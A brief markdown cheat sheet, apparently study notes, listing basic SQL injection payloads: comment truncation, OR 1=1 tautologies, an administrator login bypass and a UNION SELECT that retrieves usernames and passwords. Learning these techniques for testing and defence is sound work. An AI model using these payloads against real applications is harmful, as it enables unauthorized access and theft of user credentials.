# SQL Injection

### Commands

1. Comment

```
SELECT * FROM products WHERE category = 'xxx' AND id = xyz
SELECT * FROM products WHERE category = 'xxx'--' AND id = xyz

```

2. Make true = ture -> rest is ignored 

```
SELECT * FROM products WHERE category = 'xxx' OR 1=1--' AND id = xyz
```

3. OR 
```
SELECT * FROM Users WHERE Name ="" or ""="" AND Pass ="" or ""=""
```

4. Subverting application logic

```
SELECT * FROM users WHERE username = 'xxx' AND password = 'xyz'
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''

```

4. Retrieving data from other database tables with Union 

```
SELECT name, description FROM products WHERE category = 'xxx'
' UNION SELECT username, password FROM users--
```
